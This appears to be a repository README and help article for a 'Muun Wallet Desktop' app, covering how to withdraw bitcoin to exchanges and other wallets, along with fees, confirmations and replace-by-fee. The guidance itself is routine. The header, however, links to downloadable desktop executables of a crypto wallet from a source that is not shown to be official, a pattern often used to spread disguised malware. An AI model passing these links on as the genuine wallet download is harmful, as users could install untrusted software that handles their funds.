[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# How to Withdraw Bitcoin from Muun Wallet

Whether you are sending Bitcoin to an exchange, another wallet, or a hardware wallet for cold storage, this guide covers exactly what to do and what to watch out for during a withdrawal.

---

## Before you withdraw

**Check the fee estimate first.** Muun Wallet Desktop shows the expected transaction fee before you confirm. Read it carefully. If the fee looks high relative to the amount you are sending, this is current mempool congestion — not a bug. You can wait for a quieter period or proceed if the timing matters. See [fees explained](muun-wallet-fees-explained.md) for context on what drives the cost.

**Use the right address format.** Confirm that the destination accepts the type of Bitcoin address you are sending from. Most modern wallets and exchanges accept all common address formats (legacy P2PKH starting with 1, SegWit P2SH starting with 3, and native SegWit bech32 starting with bc1). If you are sending to an older exchange or hardware wallet firmware, check their documentation.

---

## Sending to an exchange (Coinbase, Binance, Kraken, etc.)

1. Log into your exchange account and find the Bitcoin deposit page — usually under "Deposit," "Receive," or "Funding."
2. The exchange will show you a Bitcoin deposit address. Copy it exactly, or use their QR code to scan.
3. In Muun Wallet Desktop, click Send, paste or scan the exchange's deposit address.
4. Enter the amount. Muun shows the live fee estimate — review it before proceeding.
5. Confirm the send. On-chain transfers require network confirmations before the exchange credits your account — the number of required confirmations varies by exchange, typically 1–6 blocks.
6. The transaction will appear in your Muun Wallet Desktop transaction history as pending until confirmed, then as complete.

**Lightning deposits to exchanges**: some exchanges (River, Kraken, Strike) accept Lightning deposits. If your exchange provides a Lightning invoice instead of an on-chain address, you can paste that into Muun's Send field — Muun will process it as a Lightning payment. However, not all Lightning invoice formats are compatible with all exchange systems. If a Lightning send fails, use the on-chain address instead.

---

## Sending to another self-custodial wallet (Sparrow, Electrum, hardware wallet)

The process is the same as sending to an exchange — get a receive address from the destination wallet, paste it into Muun Wallet Desktop's Send field, confirm the fee, and send. Native SegWit addresses (bc1...) are preferred where the destination supports them.

If you are moving funds to a hardware wallet for cold storage, confirm the receive address on the hardware device's own screen before sending — do not trust an address shown only on your computer screen, as address substitution malware is a real threat.

---

## Sending to another person

Paste or scan their Bitcoin address or Lightning invoice. Muun handles both. For Lightning invoices, confirm the amount shown matches what the recipient told you to send — most Lightning invoices are fixed-amount and will reject a different value.

---

## Verifying the transaction went through

After sending, the transaction appears in your Muun Wallet Desktop transaction history. For on-chain sends, click the transaction to see its status and, once confirmed, its block height. You can also check the transaction ID on a public block explorer such as mempool.space to see its current confirmation count.

---

## Common issues

**The exchange is not crediting my deposit.**

Most exchanges require a minimum number of block confirmations (often 1–3 for Bitcoin) before posting the deposit to your account. Check the transaction status in Muun Wallet Desktop to confirm it is being processed on-chain. If it shows as confirmed with more than 6 confirmations and the exchange has still not credited it, contact the exchange's support with the transaction ID.

**The fee is higher than expected.**

This is mempool congestion. The fee estimate shown before confirmation is accurate — you are not being overcharged beyond what the Bitcoin network currently requires. See [fees explained](muun-wallet-fees-explained.md). If the timing is flexible, waiting a few hours or until a quieter period will typically reduce the fee.

**The transaction is stuck and not confirming.**

Use the replace-by-fee (RBF) feature in Muun Wallet Desktop to bump the fee on the pending transaction. See the [stuck transaction guide](muun-wallet-stuck-transaction-rbf.md).

---

## Related articles

- [Muun Wallet fees explained](muun-wallet-fees-explained.md)
- [How to fix a stuck transaction (RBF)](muun-wallet-stuck-transaction-rbf.md)
- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
